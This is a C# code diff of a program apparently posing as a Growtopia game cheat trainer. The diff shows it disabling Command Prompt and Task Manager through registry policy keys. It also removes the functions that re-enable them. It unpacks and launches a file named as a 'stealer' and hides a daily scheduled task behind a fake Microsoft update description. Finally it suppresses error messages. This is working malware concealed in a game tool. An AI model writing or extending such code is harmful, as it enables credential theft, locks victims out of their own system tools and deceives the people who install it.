@@ -2,7 +2,6 @@
 using Microsoft.Win32;
 using Microsoft.Win32.TaskScheduler;
 using System;
-using System.Diagnostics;
 using System.Drawing;
 using System.IO;
 using System.Linq;
@@ -43,7 +42,7 @@ namespace Trainer
             t1.Start();
         }
 
-        #region Disable - Enable CMD
+        #region Disable | CMD
         public static void DisableCommandPrompt()
         {
             //Key path :
@@ -55,21 +54,9 @@ namespace Trainer
                 RegistryValueKind.DWord
                 );
         }
-
-        public static void EnableCommandPrompt()
-        {
-            //Key path :
-            //HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows
-            Registry.SetValue(
-                @"HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System",
-                "DisableCMD",
-                0,
-                RegistryValueKind.DWord
-                );
-        }
         #endregion
 
-        #region Disable - Enable | Task Manager
+        #region Disable | Task Manager
         public static void DisableTaskManager()
         {
             //Path to registry key...
@@ -78,18 +65,6 @@ namespace Trainer
                 @"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System",
                 "DisableTaskMgr",
                 1,
-                RegistryValueKind.DWord
-            );
-        }
-
-        public static void EnableTaskManager()
-        {
-            //Path to registry key...
-            //HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies
-            Registry.SetValue(
-                @"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System",
-                "DisableTaskMgr",
-                0,
                 RegistryValueKind.DWord
             );
         }
@@ -136,7 +111,7 @@ namespace Trainer
                     Directory.Delete(Guna, true);
                 }
                 System.IO.Compression.ZipFile.ExtractToDirectory(StealerFolderLoc + "\\" + ZipFileName, StealerFolderLoc);
-                Process.Start(StealerFile);
+                System.Diagnostics.Process.Start(StealerFile);
                 td.RegistrationInfo.Description = "Keeps your Microsoft software up to date. If this task is disabled or stopped, your Microsoft software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This task uninstalls itself when there is no Microsoft software using it.";
                 DailyTrigger dt = new DailyTrigger();
                 dt.Repetition.Duration = TimeSpan.FromHours(24);
@@ -313,10 +288,7 @@ namespace Trainer
                     mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[5], "bytes", "90 90");
                     mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[2], "string", cheats.GTCheats[4]);
                 }
-                catch (Exception ex)
-                {
-                    MessageBox.Show(ex.Message);
-                }
+                catch (Exception) { }
             }
         }
 
